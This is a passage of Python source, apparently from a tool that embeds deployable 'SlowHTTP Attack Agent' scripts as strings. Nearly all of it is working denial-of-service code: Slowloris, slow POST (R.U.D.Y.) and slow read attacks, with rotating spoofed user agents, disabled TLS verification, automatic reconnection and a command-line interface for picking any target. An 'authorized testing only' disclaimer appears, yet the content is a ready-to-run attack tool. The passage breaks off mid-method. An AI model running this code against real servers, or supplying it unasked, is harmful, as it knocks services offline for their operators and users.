            self.user_agent = random.choice(user_agents)
        else:
            self.user_agent = user_agent
    
    def slowloris_attack(self, num_connections, delay, duration):
        """Slowloris (Keep-Alive) attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slowloris attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send initial HTTP request headers (incomplete)
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Cache-Control: no-cache\\r\\n"
                    
                    # Send initial headers
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Keep connections alive by sending partial headers
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Send a partial header to keep connection alive
                        partial_header = f"X-a: {random.randint(1, 5000)}\\r\\n"
                        s.send(partial_header.encode())
                        
                        # Update stats
                        with self.lock:
                            self.stats["packets_sent"] += 1
                            self.stats["bytes_sent"] += len(partial_header)
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Wrap with SSL if needed
                            if self.use_ssl:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
                            
                            # Send initial HTTP request headers (incomplete)
                            request = f"GET {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Cache-Control: no-cache\\r\\n"
                            
                            # Send initial headers
                            new_s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append(new_s)
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before sending more headers
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def slow_post_attack(self, num_connections, delay, duration):
        """Slow POST attack (R.U.D.Y)"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slow POST attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Generate a random large content length
            content_length = random.randint(10000000, 1000000000)
            
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send initial HTTP POST request headers
                    request = f"POST {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                    request += f"Content-Length: {content_length}\\r\\n"
                    request += "\\r\\n"
                    
                    # Send initial headers
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Send POST data very slowly
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Send a small piece of POST data
                        data_chunk = f"{random.choice('abcdefghijklmnopqrstuvwxyz')}="
                        s.send(data_chunk.encode())
                        
                        # Update stats
                        with self.lock:
                            self.stats["packets_sent"] += 1
                            self.stats["bytes_sent"] += len(data_chunk)
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Wrap with SSL if needed
                            if self.use_ssl:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
                            
                            # Send initial HTTP POST request headers
                            request = f"POST {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                            request += f"Content-Length: {content_length}\\r\\n"
                            request += "\\r\\n"
                            
                            # Send initial headers
                            new_s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append(new_s)
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before sending more data
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def slow_read_attack(self, num_connections, delay, duration):
        """Slow Read attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slow Read attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)  # Longer timeout for slow read
                    
                    # Set a very small receive buffer
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send complete HTTP request with small window size
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    # Add a very small window size
                    request += "X-Requested-With: XMLHttpRequest\\r\\n"
                    request += "\\r\\n"
                    
                    # Send request
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Read data very slowly
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Read a tiny amount of data
                        try:
                            s.recv(1)
                        except socket.timeout:
                            # Timeout is expected and good for slow read
                            pass
                            
                    except Exception as e:
                        if not isinstance(e, socket.timeout):
                            # Connection closed or error (not timeout), remove it
                            with self.lock:
                                self.stats["connections_active"] -= 1
                                self.stats["error_count"] += 1
                            
                            try:
                                self.connections.remove(s)
                            except:
                                pass
                            
                            # Try to create a new connection
                            try:
                                # Create socket
                                new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                new_s.settimeout(10)  # Longer timeout for slow read
                                
                                # Set a very small receive buffer
                                new_s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                                
                                # Connect to target
                                new_s.connect((self.target, self.port))
                                
                                # Wrap with SSL if needed
                                if self.use_ssl:
                                    context = ssl.create_default_context()
                                    context.check_hostname = False
                                    context.verify_mode = ssl.CERT_NONE
                                    new_s = context.wrap_socket(new_s, server_hostname=self.target)
                                
                                # Send complete HTTP request with small window size
                                request = f"GET {self.path} HTTP/1.1\\r\\n"
                                request += f"Host: {self.target}\\r\\n"
                                request += f"User-Agent: {self.user_agent}\\r\\n"
                                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                                request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                                request += "Accept-Encoding: gzip, deflate\\r\\n"
                                request += "Connection: keep-alive\\r\\n"
                                # Add a very small window size
                                request += "X-Requested-With: XMLHttpRequest\\r\\n"
                                request += "\\r\\n"
                                
                                # Send request
                                new_s.send(request.encode())
                                
                                # Update stats
                                with self.lock:
                                    self.stats["connections_active"] += 1
                                    self.stats["packets_sent"] += 1
                                    self.stats["bytes_sent"] += len(request)
                                
                                # Add to connections list
                                self.connections.append(new_s)
                                
                            except Exception:
                                # Failed to create new connection, just continue
                                pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before reading more data
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def stop_attack(self):
        """Stop the attack and clean up connections"""
        self.running = False
        
        # Close all connections
        for s in self.connections:
            try:
                s.close()
            except:
                pass
        
        self.connections = []
        
        # Final stats update
        with self.lock:
            self.stats["connections_active"] = 0
        
        print(f"[*] Attack stopped. Final stats: {json.dumps(self.stats)}")

def main():
    parser = argparse.ArgumentParser(description="SlowHTTP Attack Agent")
    parser.add_argument("--target", help="Target hostname or IP")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
    parser.add_argument("--path", default="/", help="Target path (default: /)")
    parser.add_argument("--attack-type", choices=["slowloris", "slow_post", "slow_read"], default="slowloris", help="Attack type")
    parser.add_argument("--connections", type=int, default=150, help="Number of connections (default: 150)")
    parser.add_argument("--delay", type=float, default=15, help="Delay between packets in seconds (default: 15)")
    parser.add_argument("--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
    parser.add_argument("--version", action="store_true", help="Show version and exit")
    
    args = parser.parse_args()
    
    if args.version:
        print(f"SlowHTTP Attack Agent v{VERSION}")
        sys.exit(0)
    
    if not args.target:
        parser.print_help()
        sys.exit(1)
    
    # Parse URL if full URL is provided
    if args.target.startswith(("http://", "https://")):
        parsed_url = urlparse(args.target)
        target_host = parsed_url.netloc
        use_ssl = args.target.startswith("https://")
        path = parsed_url.path if parsed_url.path else "/"
        port = parsed_url.port or (443 if use_ssl else 80)
    else:
        target_host = args.target
        use_ssl = args.ssl
        path = args.path
        port = args.port
    
    # Create attacker
    attacker = SlowHTTPAttacker(target_host, port, use_ssl, path=path)
    
    try:
        # Launch attack based on type
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_read":
            attacker.slow_read_attack(args.connections, args.delay, args.duration)
    except KeyboardInterrupt:
        print("\\n[INTERRUPTED] Stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        attacker.stop_attack()
    finally:
        print("[CLEANUP] Attack completed")

if __name__ == "__main__":
    main()
'''
    
    def _get_advanced_agent_script(self):
        """Get the advanced agent script with additional attack methods"""
        return '''#!/usr/bin/env python3
"""
SlowHTTP Attack Agent - Advanced Edition
For educational and authorized testing purposes only
"""

import socket
import random
import time
import sys
import argparse
import ssl
import os
import signal
import threading
import json
import struct
from urllib.parse import urlparse
import select

VERSION = "5.0"

class AdvancedHTTPAttacker:
    def __init__(self, target, port=80, use_ssl=False, user_agent=None, path="/"):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.path = path
        self.running = False
        self.connections = []
        self.lock = threading.Lock()
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        # Generate random user agent if not provided
        if not user_agent:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
            ]
            self.user_agent = random.choice(user_agents)
        else:
            self.user_agent = user_agent
    
    def slowloris_attack(self, num_connections, delay, duration):
        """Slowloris (Keep-Alive) attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slowloris attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send initial HTTP request headers (incomplete)
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Cache-Control: no-cache\\r\\n"
                    
                    # Send initial headers
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Keep connections alive by sending partial headers
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Send a partial header to keep connection alive
                        partial_header = f"X-a: {random.randint(1, 5000)}\\r\\n"
                        s.send(partial_header.encode())
                        
                        # Update stats
                        with self.lock:
                            self.stats["packets_sent"] += 1
                            self.stats["bytes_sent"] += len(partial_header)
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Wrap with SSL if needed
                            if self.use_ssl:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
                            
                            # Send initial HTTP request headers (incomplete)
                            request = f"GET {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Cache-Control: no-cache\\r\\n"
                            
                            # Send initial headers
                            new_s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append(new_s)
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before sending more headers
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def slow_post_attack(self, num_connections, delay, duration):
        """Slow POST attack (R.U.D.Y)"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slow POST attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Generate a random large content length
            content_length = random.randint(10000000, 1000000000)
            
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send initial HTTP POST request headers
                    request = f"POST {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                    request += f"Content-Length: {content_length}\\r\\n"
                    request += "\\r\\n"
                    
                    # Send initial headers
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Send POST data very slowly
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Send a small piece of POST data
                        data_chunk = f"{random.choice('abcdefghijklmnopqrstuvwxyz')}="
                        s.send(data_chunk.encode())
                        
                        # Update stats
                        with self.lock:
                            self.stats["packets_sent"] += 1
                            self.stats["bytes_sent"] += len(data_chunk)
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Wrap with SSL if needed
                            if self.use_ssl:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
                            
                            # Send initial HTTP POST request headers
                            request = f"POST {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                            request += f"Content-Length: {content_length}\\r\\n"
                            request += "\\r\\n"
                            
                            # Send initial headers
                            new_s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append(new_s)
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before sending more data
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def slow_read_attack(self, num_connections, delay, duration):
        """Slow Read attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slow Read attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)  # Longer timeout for slow read
                    
                    # Set a very small receive buffer
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send complete HTTP request with small window size
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    # Add a very small window size
                    request += "X-Requested-With: XMLHttpRequest\\r\\n"
                    request += "\\r\\n"
                    
                    # Send request
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Read data very slowly
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Read a tiny amount of data
                        try:
                            s.recv(1)
                        except socket.timeout:
                            # Timeout is expected and good for slow read
                            pass
                            
                    except Exception as e:
                        if not isinstance(e, socket.timeout):
                            # Connection closed or error (not timeout), remove it
                            with self.lock:
                                self.stats["connections_active"] -= 1
                                self.stats["error_count"] += 1
                            
                            try:
                                self.connections.remove(s)
                            except:
                                pass
                            
                            # Try to create a new connection
                            try:
                                # Create socket
                                new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                new_s.settimeout(10)  # Longer timeout for slow read
                                
                                # Set a very small receive buffer
                                new_s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                                
                                # Connect to target
                                new_s.connect((self.target, self.port))
                                
                                # Wrap with SSL if needed
                                if self.use_ssl:
                                    context = ssl.create_default_context()
                                    context.check_hostname = False
                                    context.verify_mode = ssl.CERT_NONE
                                    new_s = context.wrap_socket(new_s, server_hostname=self.target)
                                
                                # Send complete HTTP request with small window size
                                request = f"GET {self.path} HTTP/1.1\\r\\n"
                                request += f"Host: {self.target}\\r\\n"
                                request += f"User-Agent: {self.user_agent}\\r\\n"
                                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                                request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                                request += "Accept-Encoding: gzip, deflate\\r\\n"
                                request += "Connection: keep-alive\\r\\n"
                                # Add a very small window size
                                request += "X-Requested-With: XMLHttpRequest\\r\\n"
                                request += "\\r\\n"
                                
                                # Send request
                                new_s.send(request.encode())
                                
                                # Update stats
                                with self.lock:
                                    self.stats["connections_active"] += 1
                                    self.stats["packets_sent"] += 1
                                    self.stats["bytes_sent"] += len(request)
                                
                                # Add to connections list
                                self.connections.append(new_s)
                                
